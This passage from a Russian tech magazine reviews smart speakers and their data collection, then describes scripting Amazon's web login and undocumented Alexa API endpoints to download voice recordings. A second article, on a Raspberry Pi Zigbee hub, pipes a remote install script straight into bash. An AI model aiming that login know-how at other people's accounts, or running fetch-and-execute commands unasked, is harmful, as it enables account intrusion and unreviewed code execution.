бы, чтобы Cortana была в доме у каждого пользователя. Но на десктопах
и ноутбуках голосовым помощником пользуется исчезающе малый процент,
а телефонов с собственной мобильной ОС, в которой Cortana была бы
ассистентом по умол чанию, у компании больше нет. Вот и приходится Mi‐
crosoft скрепя сердце пускаться в эксперименты, ста раясь потратить на них
как можно меньше денег… с соот ветс твующим результатом.


КАКОЙ АССИСТЕНТ ЛУЧШЕ?
Уверен, заметная часть читателей откры ла эту статью исключительно ради
сравнительного обзора цифровых ассистентов. В нашей лаборатории соб‐
рался целый парк устройств, на каж дом из которых работает тот или иной
цифровой ассистент. В этом раз деле мы рас смотрим как сами устройства,
так и возможности их цифровых ассистентов.
  К сожалению, единс твенный рус скоязычный помощ ник Алиса компании
Яндекс к нам на тестирова ние не попал, так что в обзоре будут участвовать
только англоговорящие устройства.


Google Home
В нашей лаборатории есть как средняя колонка Google Home, так и ее
мини‐версия.





Настройка обоих устройств прос та и проз рачна — через приложение для iOS
или Android. На колонках мож но выбрать нес колько язы ков, но рус ский
в перечень не входит. Учитывая, что Google Assistant давно доступен на рус‐
ском языке как в смартфо нах, так и в телеприставках (например, NVIDIA Shield
TV), ограниче ние выглядит искусс твенным.
  В обоих устрой ствах отлично реализованы микрофоны; проблем с рас‐
познаванием нет даже во время проигрывания музыки. Качество звучания
у средней колонки Google Home замет но выше, чем у первого поколе ния
Amazon Echo; удивительно для столь компактных размеров.
  С точки зрения под держки устройств умно го дома Google ненамного
отстала от Alexa. Все имеющиеся у нас устрой ства с под держкой Alexa уда‐
лось добавить и в приложение Google Home. А вот встроенный хаб в Google
Home отсутствует; «рулить» устройствами можно либо через Wi‐Fi, либо
при помощи выделенного хаба (например, от Philips).
   Google Assistant, пожалуй, самый умный цифровой ассистент. У него есть
доступ ко всей информации из тво ей учет ной записи Google, к твоему поч‐
товому ящику Gmail, кален дарям, контактам, исто рии поисковых запросов
и истории браузера. С большой вероятностью Google Home отве тит на твои
вопросы в контексте тво их предыдущих запросов, сделанных на любом
устройстве. В  Google  поддерживает ся  мно гопользовательский  режим:
ассистент способен определять пользователя по голосу и выдавать соот‐
ветствующий ситуации ответ. При этом нужно чет ко понимать, что все сказан‐
ное после активации колонки клю чевым словом будет записано, передано
на сервер Google и сохранено на нем до тех пор, пока ты лично не зайдешь
и не удалишь данные. В наших исследова ниях мы находили запросы полуто‐
ра‐двухгодичной давности.
   Расширения системы, стереопар — не предус мотрено.


Amazon Echo и Alexa
У Amazon самый широкий ассортимент устройств с умным голосовым
ассистентом. Это и несколько поколений раз нообразных колонок, и устрой‐
ства со встроенным хабом умного дома, и прис тавки Fire TV, и устройства
с экранами любой формы, и даже микроволновка. Amazon действительно
стремится к тому, чтобы Алекса вещала из каж дого утюга, и совершает прак‐
тические шаги в этом направлении.
  В нашей лаборатории побыва ли устройства Echo Dot 2, Echo первого
и второго поколений, Echo Plus первого поколения, нес колько поколе ний Fire
TV и также устрой ство с экра ном Echo Spot. Рас смотрим основные особен‐
ности.
  Первоначально настра ивать колонку нужно через приложение  Alexa
для iOS или Android (настройка Echo Spot и Echo Show — с экрана самого
устройства). Настрой ка проста и обходится без сюрпризов. Каждому устрой‐
ству можно назначить свою комнату, а для некоторых моделей (Echo 2 Gen,
Echo Plus обоих поколе ний) и роль в стереопа ре. Можно допол нительно под‐
клю чить недоро гой беспро водной сабвуфер Echo Sub.
   Кстати, «недорогой» — ключевая  характерис тика  всех современных
устройств Amazon. Компания идет по пути пос ледовательного удешевления
аппаратной начинки, пытаясь при помощи программных наработок сохранить
или улучшить качество звучания. Многие ли видели вживую первое поколение
Echo Dot, быстро сменившееся вторым? А ведь в них было реализовано
управление громкостью, как в «больших» Echo, присутствовали допол нитель‐
ные порты и элементы управления. Но второе поколение стало дешевле —
и побило все мыслимые рекорды про даж. То же произошло и пос ле замены
первого поколения Echo на вто рое, с более дешевой аппаратной начинкой,
но программным образом усиленными басами (программное усиление стало
очевидным, когда первые партии устройств были дос тавле ны с оригинальной
прошивкой и откровенно «жестяным» зву ком. Нас трой ки эквалайзера быс тро
подкрутили в оче редном обновлении прошивки).
  Тем не менее колонки от Amazon предлагают уверенное распознавание
как слова‐активатора, так и последующих голосо вых команд: набор мик‐
рофонов и алгоритмы шумоподавления и вычитания собственного звука
реализованы образцово.
   Качество звучания самих колонок скорее посредственное, чем хорошее.
Первое поколение Echo предлагает сба лансированный звук, но низких частот
маловато. Второе поколение Echo я слушать не смог, но пос ле обновле ния
прошивки с усилением низких частот пользователям стало нравиться. Echo
Plus первого поколения играет довольно громко, но низких частот слишком
много, они подав ляют середину; зву чание колонки не получается назвать чис‐
тым или сбалансированным. Впрочем, для фонового прослушивания хватит
любой из этих колонок, а аудиофилам здесь ловить в любом слу чае нечего.
Энтузиасты смогут подключить миниатюрный Echo Dot к стереосистеме
или активным колонкам пос редством ауди овыхода 3,5 мм; звук в этом случае
получается достаточно неплохим.
  А что насчет самой Алексы? Алекса — весь ма продвинутый голосовой
помощник  с массой  достоинств  и  неболь шим набором  недостатков,
основной из которых — отсутствие поддержки рус ского язы ка и невнятные
перспективы его появления. Если у Google и Apple рус ский язык уже давно
поддерживается в телефонных версиях ассистентов и его внедрение в колон‐
ки — вопрос времени, то Amazon как магазин на российском рынке не при‐
сутствует, колонки не про дает, подписок на цифровой контент не предлагает.
Как ни грустно это признавать, у Amazon мень ше всего стимулов для внед‐
рения русского языка в свои устройства.
   Что умеет Алек са? Все, что должен уметь цифровой ассистент. Таймеры,
напоминания, ответы на вопросы. Аудиокниги и сказ ки. Широчайший спектр
поддерживаемых устройств умно го дома. Разумеется, музыка — если у тебя
есть подписка на Amazon Prime или Amazon Music Unlimited (пос ледняя, кста‐
ти, доступна за полцены, если активировать подписку с колонки Echo и про‐
игрывать композиции только через колонки).
   Так же как и Google, Amazon собира ет информа цию о том, как ты исполь‐
зуешь колонку. Ниже мы рас смотрим, какую именно информацию и как ее
извлечь.


                                     Продолжение статьи →
ПРИВАТНОСТЬ           ← НАЧАЛО СТАТЬИ

             АЛЕКСА,
     СКАЖИ КОРТАНЕ,
      ПУСТЬ ПОИЩЕТ
            В ГУГЛЕ
                   КАКИЕ БЫВАЮТ УМНЫЕ КОЛОНКИ,
          КАК ОНИ РАБОТАЮТ И КАКУЮ ИНФОРМАЦИЮ
                         О НАС СОБИРАЮТ





Сто рон ние колон ки с Alexa
Из сторонних колонок с Alexa в нашей лаборатории прочно прописалась
Sonos One.





Для настройки потребуется уста новить при ложение Sonos; интеграция с Alexa
произойдет в самом конце нас тройки (можно и не интегри ровать, собствен‐
ный набор функций колонки дос таточно богат). Вообще, все сторонние
колонки с Alexa исполь зуют сложную дву хэтапную схему нас тройки: сначала
через собственное приложение производителя и только потом — через при‐
ложение самой Alexa. Колонки с Google Home в этом смыс ле настраивать
проще: их настрой ка полностью ведется через единственное приложение
Home от Google.
   Качество  звука  у Sonos One  отличное;  звук  гораздо  естественнее
и богаче, чем у любых колонок производс тва Amazon. Чистая середина и при‐
ятный бас (для любителей низких час тот в линей ке предусмотрен сабвуфер).
Функциональные возможнос ти поража ют воображение. Поддерживается
множество разнооб разных стриминговых музыкаль ных сервисов, а кроме
того, в Sonos можно штатным обра зом про индекси ровать свой NAS‐сервер.
Приложение самостоятель но найдет и проиндексирует музыку. После этого
по голосовым командам ста нет воз можным проигрывать именно ее и именно
с NAS, а не из облачного сервиса по подписке. Наконец, сис тему можно рас‐
ширять: добавить вторую колонку для стереозвучания, сделать multiroom,
добавить сабвуфер.
  Наверное,  единственное,  в  чем  Sonos  One  уступает  колонкам
от Amazon, — качество рас позна вания голоса во время проигрывания
музыки. «Вычитание» собственного зву чания реализовано не так хорошо,
как у Amazon. Впрочем, если качес тво распознавания было серьезной проб‐
лемой в первые пол года, то сейчас его подтянули до впол не приемлемого
уровня. В целом Sonos One, наверное, лучшее решение с Alexa.


Harman Kardon Invoke и Cortana
К сожалению, Кортана не набрала той популярности, которая дос талась
на долю альтер натив ных цифровых ассистентов. Кортана предустановлена
на все компьютеры с Windows 10, но огра ниченный набор поддерживаемых
языков и регионов позволяет насладиться всем богатством ее воз можнос тей
лишь пользователям из США и Канады. В то же время собственной мобиль‐
ной ОС у Microsoft больше нет, как нет и собственных моделей смартфонов.
  Компания пытается повлиять на положение дел, встроив поддержку Cor‐
tana в приложение Outlook для iOS и Android, а также в Microsoft Launcher
для Android. Есть и отдель ное приложение Cortana. В качестве умных колонок
Кортана представлена единс твенной моделью — Harman Kardon Invoke.
   Что представляет собой HK Invoke? Это довольно симпатичная колонка
с приятным  дизайном и  (забегая  вперед) хорошим  качеством  звука.
К сожалению, доступна только в США, но Amazon соглашается прис лать ее
и в другие страны. Блок питания с американской вилкой, но поддерживает
диапазон 100–230 В.





Начальная настройка Invoke с Cortana — неболь шой ад. Во‐первых, для нас‐
тройки необходимо установить где‐нибудь приложение Cortana. Не подумай,
что это можно проделать на компьютере с Windows 10: Cortana там есть,
но попытка настроить Invoke заканчивается сооб щением в типичном для Mi‐
crosoft стиле: «Something’s not right. Try again in a  little bit». Нам пришлось
использовать смартфон Lumia 950 с Windows 10 Mobile, без которого нас‐
тройка не шла.
   Активируется ассистент (пос ле всех обновлений) простым словом Cor‐
tana. Качество распознавания хорошее, но поддерживается исключительно
американский вариант английского языка.
  Для проигрывания музыки есть вариант подключения через Bluetooth
(циники могут подключить на вход Invoke колонку Amazon Echo Dot и нас‐
лаждаться доступом к Amazon Music). Для голосового же управления требует‐
ся платная учетная запись  Spotify. Поддерживают ся сервисы iHeartRadio
и TuneIn, но за пределами США/Канады дос туп к радиостанциям будет очень
ограниченным. Обрати внимание, что для музыки через Spotify нужна платная
подписка (в Google Home достаточно бес платной), iHeartRadio не будет
работать за пределами США и Канады из‐за огра ничений по географии.
В результате музыку ты услышишь только через TuneIn; этого достаточно, что‐
бы оценить качество звука.
   Качество звучания колонки сбалансированное. Уровень низ ких частот
где‐то посередине между первым поколением Amazon Echo и Echo Plus,
а средние и высокие час тоты воспроизводятся чище, чем на любой колонке
от Amazon.
  Микрофоны: отлично. Распозна вание, в том чис ле во время проигры‐
вания, — просто отлично.
  Из дополнительных бонусов Microsoft предлагает пожиз ненную подписку
на звонки через Skype на американские телефонные номера. Звонить можно
прямо с колонки, номера диктовать голосом. А вот возможности рас ширения
у колонки отсутствуют напрочь.
   Что же касается собственно Cortana, то вердикт однозначен: это — только
для США. Прогноз погоды выдает в градусах Фаренгейта; слышать, что
за окном сейчас 31 градус, — откровенно странно. Переключить на градусы
Цельсия нельзя; настройки в приложении игно рируются. Количество под‐
держиваемых устрой ств умного дома минималь ное.
   Стоит ли покупать колон ку, если ты не живешь в США или Канаде? Как ни
странно, ответ не будет однозначным. Да, за те 199 дол ларов, которые про‐
сили за колонку на старте продаж, покупка лишена вся кого смысла (разве что
с целью добавить еще одного зверька в зоопарк, как это сделали мы в нашей
лаборатории). Ощущения от устройства такие же, как от многих других
поделок Microsoft: идея прекрасная, железка отличная, но реализация соф‐
та — сыро, недоде лано, огра ниченно, с массой ошибок и невнятными сооб‐
щениями.
  Однако сегодня эту колонку можно купить всего за 50 долларов (в США),
что существенно дешевле, чем простые колонки с Bluetooth, обладающие
заметно худшим звучанием. За 50 баксов покупка имеет смысл. А если ты
время от вре мени звонишь на телефонные номера в США, то пожизненная
подписка на неограниченные звонки через Skype на американские телефон‐
ные номера окупит невысокую стоимость колонки.


Cortana + Alexa = ?
Самый распространенный цифровой ассистент на выделенных устрой ствах
(колонки, экраны, приставки к телевизору) — Amazon Alexa. В домах поль‐
зователей работает более 8 миллионов умных  колонок Amazon Echo
с Alexa — и это не считая планшетов Kindle Fire, приставок Fire TV и самых
разнообразных устройств сторонних произво дителей  (к при меру, Sonos
или Lenovo).
  В то же время число пользователей, на устрой ствах которых установлен
Google Assistant, исчисляется сотнями миллионов. Но многие ли действитель‐
но пользуются голосовым ассистентом на смартфонах с Android? Количество
же колонок Google Home и Google Home Mini относительно невелико.
  Обратимся к статистике. В статье TechCrunch при водятся следующие циф‐
ры. Из тех пользователей, у кого есть хотя бы одна умная колонка, в 71,9%
случаев это будет что‐то с поддержкой Amazon Alexa, 18,4% приходится
на долю Google Home.





На долю Cortana с единственной моделью Harman Kardon Invoke приходится
всего 0,6% рынка — и это корректная цифра, отра жающая состояние аме‐
риканского рынка.





Очевидно, Microsoft такое положение дел не устра ива ло. В августе прошлого
года Microsoft и Amazon объявили об интеграции двух ассистентов, а спустя
год компаниям даже удалось выпус тить рабочую бета‐версию.
  Две огромные компании больше года не покладая рук работали над тем,
чтобы Кортана могла вызвать Алексу командой «Cortana, open Alexa», после
чего последующие команды обра баты вались бы уже Алексой. В обратную
сторону все работает похожим образом: американский владелец колонки
Echo может скомандовать «Alexa, open Cortana», после чего получит доступ
ко всем способностям цифрового помощ ника от Microsoft. К сожалению,
интеграция, даже когда она появится официально, пока заявлена только
для рынка США.
  Зачем это нужно обеим компаниям? Для Microsoft — оче видно, это дос туп
ее пользователей к музыкальному сервису Amazon Music и обширной биб‐
лиотеке из более 40 тысяч поддерживаемых Алексой «умений» (skills). С точки
зрения Amazon выгода менее очевидна; тем не менее Cortana гораз до лучше
справляется с типич но офисной работой — календарями и почтой Outlook,
интеграцией с рабочим Exchange. Получше обсто ят дела у Cortana и с собс‐
твенно «интеллек том»: Алекса умеет больше, но Кортана больше знает.


Apple HomePod и Siri
HomePod — полная противоположность Invoke. Никаких, просто ни малей ших
проблем с установкой! Если ты его купил, то можешь быть уве рен — оно
будет работать, и скорее хорошо, чем плохо. Нас тройка — тапнуть по колонке
разблокированным iPhone или iPad, «да», «да», «хм‐м? Ну давай» (на вопрос
о четырехмесячной бесплатной подписке на Apple Music). Все. Скучно? Зато
работает. А вот без iPhone или iPad колонку акти вировать не удастся.





Микрофоны в HomePod очень хорошие — на уровне Amazon Echo Plus.
Звук — отличный; впрочем, про него уже много писали и без меня. Чувству‐
ется работа DSP: даже на низкой громкости (для меня комфортный уро‐
вень — порядка 15%) колонка замет но «басит».
   Качество звука похоже на Sonos One, но работа DSP ощущается сильнее.
Кроме того, у HomePod более глубокие басы. Если добавить второй Home‐
Pod, то получим стереопа ру, а качество звука станет еще немного лучше. Звук
в целом сбалансированный (с преобладанием низ ких частот), слу шать при‐
ятно.
   Если сравнивать с Amazon Echo Plus, то звук HomePod гораздо более сба‐
лансирован, глубже бас. Колонки игра ют в раз ных лигах. Если сравнить с In‐
voke (Cortana) — у HomePod глуб же басы, но середина у HK мне нравится
больше. В срав нении с Google Home — прос то мощнее, глубже бас, лучше
звучит.
  А что насчет Siri? Если ты пользуешь ся iPhone и привык к Сири, которая
говорит на русском языке, то HomePod сделает тебе отвыкнуть: Siri из Home‐
Pod готова общаться на английском, немецком, французском или испанском.
С учетом того, что внутри колонки — про цес сор из iPhone 6 и самая све жая
iOS 12, такое ограничение выглядит совершенно искусственным. Впрочем,
Сири из Apple TV также не говорит по‐русски, а это тем более странно, что
Apple TV официально про дается в Рос сии.
  Полезность Siri из HomePod довольно сомнитель на. Да, тут есть будиль‐
ники и музыка (за допол нитель ные день ги). Управление устройствами умного
дома? Только HomeKit, а таких на рынке сравнитель но мало, и стоят они срав‐
нительно дорого. База зна ний у Siri уступает базе знаний Alexa, а тем более
Google Home. Зато, по утверждениям Apple, компания не сохраняет записи
твоих голосовых команд на своих серверах.


КАК ЭТО РАБОТАЕТ?
Все цифровые ассистенты разные, но прин цип работы у них похож. Большую
часть времени колонка  «спит»; активны лишь микрофоны, информация
от которых обрабатывается локально самым экономным DSP. В спящем
режиме все, к чему прислушивается DSP, — это кодовое слово активации
цифрового помощ ника. Обрати внимание: на данном этапе вся обработка
проходит локально.
   Как только DSP распозна ет кодовое слово, колонка включает запись,
которая будет передана на сервер для распознавания и обработки в потоко‐
вом режиме. Дальнейшие действия выполняются на сервере: распознается
голосовой запрос и определяется, к какому сервису или разным сервисам
его нужно отправить.
  Например, простейшая команда «turn on the lights» сначала определит,
на какое устройство (в какой комнате) поступил запрос, к какой именно груп‐
пе элементов умного дома относится сло во lights, про анализирует саму груп‐
пу lights и выберет, к каким имен но skills нужно адресовать команду (в моем
случае это смесь из ламп Xiaomi и выключателей TP‐Link, работающих
по совершенно разным протоколам). Соответс твующие команды будут адре‐
сованы к соответствующим сервисам (для устрой ств, работающих по про‐
токолу  Zigbee,  колонки  линейки  Echo  Plus  могут  послужить  хабом),
при помощи сер вера полученный от них резуль тат будет передан на колонку
в виде голосового отклика и озвучен пользователю.
  Примерно так выглядит обра бот ка запроса к Alexa.





Google Home работает похожим обра зом, а вот Apple HomePod имеет дело
с закрытой экосистемой Apple, что заметно упро щает обработку команд.
В частности, устрой ства, работа ющие по протоко лу Apple HomeKit, исполь‐
зуют колонку HomePod в качестве локального хаба; при этом никакие другие
устройства умно го дома попросту не поддержи вают ся. Проще и с музыкой:
если Alexa или Google Home могут играть музыку как из собственных биб‐
лиотек, так и из сторонних сервисов (например, Spotify), то HomePod будет
адресовать голосовые запросы исключительно к собс твенному сервису Apple
Music.


ИЗВЛЕКАЕМ ДАННЫЕ ГОЛОСОВЫХ КОМАНД
Итак, мы разобрались с тем, что знает о нас раз работчик искусственного
интеллекта и зачем ему это нуж но. А можно ли как‐то добраться до этих дан‐
ных? Да, можно, причем для нескольких ассистентов мы уже разработали
соответствующий софт.


Запросы к Google Assistant
Пожалуй, проще всего извлечь запросы к Google Assistant. В Google серьезно
подошли к обеспечению прозрачности при ватной информации. В твоей учет‐
ной записи Google доступна подробная история всех твоих голосовых зап‐
росов. По крайней мере — в теории. Если открыть страницу My activity и выб‐
рать катего рию Assistant, можно посмотреть историю голосовых запросов.
В отличие от Amazon Google предоставит дос туп толь ко к рас познанным фра‐
зам в текстовом виде. Включение категории Voice & Audio должно, казалось
бы, предоставить доступ к оригинальным записям голосовых команд, но это‐
го не происходит. Тем не менее прос мотреть содержимое даже распознан‐
ных голосовых команд — уже интересно. Пря мая ссылка.


                                     Продолжение статьи →
ПРИВАТНОСТЬ           ← НАЧАЛО СТАТЬИ

             АЛЕКСА,
     СКАЖИ КОРТАНЕ,
      ПУСТЬ ПОИЩЕТ
            В ГУГЛЕ
                   КАКИЕ БЫВАЮТ УМНЫЕ КОЛОНКИ,
          КАК ОНИ РАБОТАЮТ И КАКУЮ ИНФОРМАЦИЮ
                         О НАС СОБИРАЮТ





Запросы к Amazon Alexa
У Amazon нет такого удоб ного и подробного портала, как у Google, однако
просмотреть историю голосовых запросов все‐таки можно. До недавнего
времени история запросов к Alexa была дос тупна исключительно через при‐
ложение Alexa для смартфо нов и планшетов. Не так давно появился и спе‐
циальный онлайновый портал. Для того чтобы прос мотреть историю своих
запросов к Alexa, нужно перейти по этой ссылке.
  Откроется страница управления контентом и устрой ствами.





Если хотя бы на одном из тво их устройств установлено приложение Alexa (и
ты настроил вход в учетную запись Amazon), то ты увидишь ссыл ку на Alexa Pri‐
vacy. Если такой ссылки нет, то в тво ей учет ной записи, скорее все го, нет дан‐
ных Alexa.
  Перейди по ссылке Alexa Privacy.





На следующей странице выбери Review Voice History.





Здесь тебе будут доступны все записанные команды и распознанные диалоги
с цифровым помощ ником.
  А что, если ты хочешь извлечь все записи, а не прокликивать многочис‐
ленные ссылки по одной? Для внутреннего использования мы написали соот‐
ветствующую утилиту, но никто не меша ет тебе самос тоятельно оформить
скрипт. Рассмотрим, как работа ет дос туп к информации в учетных записях
Amazon.


Авторизация на сервере Alexa
Первый шаг скрипта — авторизация на сервере Amazon. Авторизоваться
можно одним из трех способов:
 • через Web, используя логин и пароль (так работают при ложения для iOS
   и Android);
 • при помощи FIRS login;
 • при помощи маркера аутентификации (token‐based login), который можно
   извлечь из cookie бра узера пользователя.

У каждого способа есть свои достоинс тва и недостатки.

Авторизация через веб‑страницу:
 • используется приложениями для iOS/Android;
 • протокол OpenId2.0, архитектура REST;
 • часть информации переда ется через cookie;
 • для извлечения данных нуж но парсить стра ницы в HTML.

Авторизация Alexa через FIRS Host:
 • запросы отправляются на сервер ﬁrs‐ta‐g7g.amazon.com/FirsProxy;
 • используется некоторыми опенсорсны ми ути литами (lolsborn/readsyn).

Че рез токен:
 • токен (маркер аутентификации) можно извлечь из cookie браузера, если
   пользователь заходил в свою учетную запись Amazon;
 • cookie, которые содержат нужные токены, короткоживущие.

Проще всего использовать логин через веб. Первым этапом происходит
предварительное получение сес сии, извлекаются скрытые поля ввода и все
необходимые куки по адресу


https://www.amazon.com/clouddrive/ref=nav_youraccount_clddrv

При  переходе  выпол няется  нес колько  редиректов;  итоговая  страница
перехода будет каждый раз отличать ся. В ней содержится несколько скры тых
полей ввода (кроме очевидных полей логина и пароля). Эти поля вместе
с паролем и логином будут использоваться для авторизации.
   Второй этап — генера ция скрытого поля metadata1. Это поле содержит
информацию об активности пользователя на странице авторизации (что
нажал, сколько раз нажал) и прочей информа ции отслеживания активности
пользователя (ОС, браузер, hash логина). Генери руется это поле в JavaScript
перед отправ кой запроса на авториза цию.
   Третий этап — непос редственно авториза ция. Скры тые поля, логин,
пароль и metadata1 фор мируют тело зап роса, который отправляется по адре‐
су


https://www.amazon.com/ap/signin

Ответ содержит куки, необ ходимые для получения доступа к данным Alexa.


Доступная информация
Для доступа к данным мы используем официальный Alexa API от Amazon.
Через API доступна масса информации, включая:
 • историю запросов: рас познанные запросы и запись голосовых команд;
 • список устройств;
 • платежные инструменты (карты, банковские счета и прочее);
 • сети и пароли Wi‐Fi;
 • устройства умного дома;
 • именованные списки;
 • данные о прилинкованных учетных записях;
 • комнаты и группы;
 • данные подписки Amazon Music;
 • слово‐активатор.

Нас интересует самый первый пункт: история запросов, доступная по запросу
к серверу


https://alexa.amazon.com/api/activities


Из вле чение голосо вых сниппетов Alexa
Для начала получим ID активнос ти, для которой хотим получить голосовой
сниппет (Recording ID):


https://alexa.amazon.com/api/activities?startTime=&size=50&offset=1

Получаем по 50 записей за запрос. Сниппеты доступны в формате WAV,
закодированном Base64. Сопутствующая информа ция воз вращается в фор‐
мате JSON.
  Манипулируя параметром startTime, можно получить всю историю зап‐
росов.


"activities": [ {
    "activityStatus": "SUCCESS",
    "creationTimestamp": 1519211054361
    "domainAttributes": "{\"answerText\":\"I'm excellent. I've got
dinosaurs on my mind. If I was around back when they roamed the
Earth, I wonder what they would have asked me. Maybe, \\\"Alexa,
what's that massive fireball streaking across the sky?\\\"\", …,\"
questionText\":\"How are you?\" … }",
    "sourceDeviceIds": [ {
       "deviceType": "A3S5BH2HU6VAYF",
       "serialNumber": "G000LF0124270MVH" } ]
    "utteranceId":
"A3S5BH2HU6VAYF:1.0/2018/02/21/11/G090LF0964270MVH/04:10::TNIH_2V.
3e25613a‐c544‐4750‐ac0d‐4fa56fb53d00ZXV"
    ... } ]

На каждый запрос получим ответ следующего вида.





Кратко расшифруем доступные поля.
   Description — распознанный текст голосового запроса и идентификатор
сниппета.
   activityStatus может принимать ряд значений:
 • SUCCESS
 • DISCARDED_NON_DEVICE_DIRECTED_INTENT    (устройством    запрос
   не распознан)
 • SYSTEM_ABANDONED (запрос прерван)

utteranceId — идентифика тор для доступа к сниппету.
  Для получения непосредственно голосовой команды активности исполь‐
зуем значение параметра utteranceId:


https://alexa.amazon.com/api/utterance/audio/data?id=

где id — это utteranceId активности.
  В ответ сервер вернет голосовую запись в формате WAV.
  Примеры запросов:


https://alexa.amazon.com/api/utterance/audio/data?id=A3S5BH2HU6VAYF:
1.0/2018/03/15/10/G090LF0964270MVH/11:26::TNIH_2V.
b079cf80‐0bca‐4f14‐bdbe‐5fb3d4bac993ZXV
https://alexa.amazon.com/api/utterance/audio/data?id=A3S5BH2HU6VAYF:
1.0/2018/03/15/10/G090LF0964270MVH/10:43::TNIH_2V.
aa06d885‐22e3‐4adc‐b684‐383c2f8613abZXV
https://alexa.amazon.com/api/utterance/audio/data?id=A3S5BH2HU6VAYF:
1.0/2018/03/15/10/G090LF0964270MVH/10:27::TNIH_2V.
55d51197‐970a‐4d1c‐bcb1‐afada4c62421ZXV

Данные приложе ния Alexa можно извлечь и непос редственно из смартфона.





Особого смысла в этом нет: история команд будет минимальной, основная
часть запросов хранится только в обла ке.
  Для внутреннего исполь зования мы написали скрипт, который позволяет
авторизоваться в учетной записи Amazon, определить страну пользователя
и извлечь всю доступную информацию.





Отдельной головной болью стали учетные записи с активной двухфакторной
аутентификацией. Мы обнаружили, что проходить двухфакторную аутен‐
тификацию приходится отдельно для раз ных категорий запросов (логин
и пароль остаются прежними и кешируются между сессиями).





Анализ моей  собствен ной  учетной  записи  вернул  1,6  Гбайт  данных,
из которых порядка 450 Мбайт сос тавляли WAV‐фай лы голосовых запросов
к Alexa за последние два года.


ЗАКЛЮЧЕНИЕ
Итак, мы подробно рассмотрели современных цифровых ассистентов и их
физические реализации; узна ли, какие данные собирают Google и Amazon
и как получить к ним доступ. В нашей стра не цифровые помощ ники больше
ассоциируются со смартфонами, и про изво дители не спе шат нарушать ста‐
тус‐кво: поддер жка русского языка ни в одной из описанных колонок не пре‐
дусмотрена.
ТРЮКИ

  ПОДКЛЮЧИТЬ
      ВСЕ!





                                                                           Виталий Юркин
                                                                                  Инженер‐программист
                                                                                         умного дома
                                                                                               aivs@yandex.ru





   ДЕЛАЕМ ЭКСТРЕМАЛЬНО ДЕШЕВЫЙ ХАБ
        ДЛЯ УСТРОЙСТВ ZIGBEE И Z‐WAVE





Начав конструировать умный дом, сложно бывает оста‐
новиться на продукции одного произво дителя. А это значит,
что тебя ждет зоопарк стандартов, которые сложно увязать
друг с другом, и рядок хабов, каждый из которых занимает
розетку (и место в твоей жизни). Нельзя ли сделать универ‐
сальный способ управления умными устрой ствами, которые
работают по ZigBee и Z‐Wave? Можно! И не придется даже
покупать контроллер ZigBee за 50 долларов.


Поводом для того, чтобы смешать дома умные устройства разных произво‐
дителей, может быть желание сэкономить, выбирая наиболее выгодные вари‐
анты, или наоборот — стремление взять все самое лучшее. Но чаще всего
ответ более прозаич ный: «так вышло». Сначала ты покупаешь лампочки и дат‐
чики движения Philips, а потом обнаруживаешь, что, к примеру, умных розеток
эта компания не делает вовсе, а тебе позарез нужна одна из них.
   Опять же, если ты выб рал Xiaomi (а предложение этой компании — одно
из самых выгодных), то тебя ждет хаб с китайским софтом, подключенный
к фирменному сервису. С точки зрения безопасности — далеко не самый
лучший вариант.
  В этой статье я покажу, как сконстру ировать универсальный хаб на основе
Raspberry Pi Zero W и экс тремально дешевого контроллера. А поможет мне
в этом программа под названием zigbee‐shepherd. Она поддерживает мно‐
жество устройств ZigBee, в том числе и выключатели Xiaomi на батарейках
серии Aqara, и позволя ет писать скрипты на JavaScript.


ВЫБИРАЕМ И ПРОШИВАЕМ ЖЕЛЕЗО
Сначала нужно определиться, на каком железе собирать хаб. В принципе, ты
можешь взять что угодно (хоть свой основной компьютер, если ты его не вык‐
лючаешь), но Raspberry Pi Zero W — это сверхкомпактный, дешевый и дос‐
таточно производительный вариант.





               Микрокомпь ютер Raspberry Pi Zero W

Zigbee‐shepherd совместим с чипами ZigBee производства Texas Instrument
CC2530 и CC2531. У TI есть референсный USB‐стик CC2531 USB Evaluation
Module Kit за 49 дол ларов, но есть и пол ная документация и схемы по сборке
такого стика, поэтому будет несложно найти в Поднебесной такой же стик,
но за 7 долларов.





          Фирменный стик Texas Instrument на чипе CC2531

Для работы стика с zigbee‐shepherd потребуется файл прошивки с GitHub,
а чтобы ее зашить, понадобится программа тор CC Debugger за 49 дол ларов
или его китайская копия за 12.





                       Texas Instrument CC Debugger

Прошивают USB‐стик с помощью официальной утилиты TI SmartRF Flash Pro‐
grammer. Чтобы все зарабо тало, нуж но подключить CC Debugger в один порт
компьютера, стик ZigBee — в другой и шлейфом соединить их между собой.





        Подклю чение CC Debugger к сти ку ZigBee для прошивки

В настройках программатора выбира ем прошиваемое устройство (1), про‐
шивку (2), задаем нужные действия (3) и про шиваем (4).





          SmartRF Flash Programmer для прошивки сти ка ZigBee

Проверить, что USB‐стик удачно прошился и работа ет, можно, подключив его
к Raspberry Pi Zero W и выполнив команду


$ ls /dev

Устройство будет отоб ражаться в системе как ttyACM0.





        При подклю чении стика появляется устройство ttyACM0


СТАВИМ СЕРВЕР ZIGBEE-SHEPHERD НА RASPBERRY PI ZERO W
Установка zigbee‐shepherd и сопутс тву ющих пакетов будет проводиться
на последней вер сии ОС Raspbian для Raspberry Pi Zero W — Stretch.
   Zigbee‐shepherd написан на JavaScript и работает на Node.js. Для начала
ставим Node.js:


$ wget ‐O ‐ https://raw.githubusercontent.com/sdesalas/node‐pi‐zero/
master/install‐node‐v.lts.sh | bash`

Для установки расширений из npm нужно установить утилиты для сборки:


$ sudo apt‐get install ‐y build‐essential

И сама установка zigbee‐shepherd:


$ npm install zigbee‐shepherd ‐ ‐save

Проверить, правильно ли работа ет zigbee‐shepherd, можно, запустив скрипт
zigbee‐server.js. Во время работы скрипт выводит информацию о каждом
этапе добавления устрой ства и время выполнения операции.


var ZShepherd = require('zigbee‐shepherd');
// Create a ZigBee server
var zserver = new ZShepherd('/dev/ttyACM0');
zserver.on('ready', function () {
    console.log('Server is ready. Allow devices to join the network
within 60 seconds');
    zserver.permitJoin(60);
});
zserver.on('permitJoining', function (joinTimeLeft) {
    console.log(joinTimeLeft);
});
// Start the server
zserver.start(function (err) {
    if (err) console.log(err);
});

Запускаем zigbee‐shepherd в режиме отладки:


$ sudo DEBUG=* node zigbee‐server.js





            Debug‐вывод при добавлении устройства ZigBee


             INFO

                     На этапе разработки скрипта для Node.js всегда
                       используй отладочный режим. Вывод при этом
                      более подробный, легче отловить ошибки, а zig‐
                        bee‐shepherd показывает все данные, которые он
                       отправляет и получает.



РАБОТАЕМ С ВЫКЛЮЧАТЕЛЯМИ XIAOMI ИЗ ZIGBEE-SHEPHERD





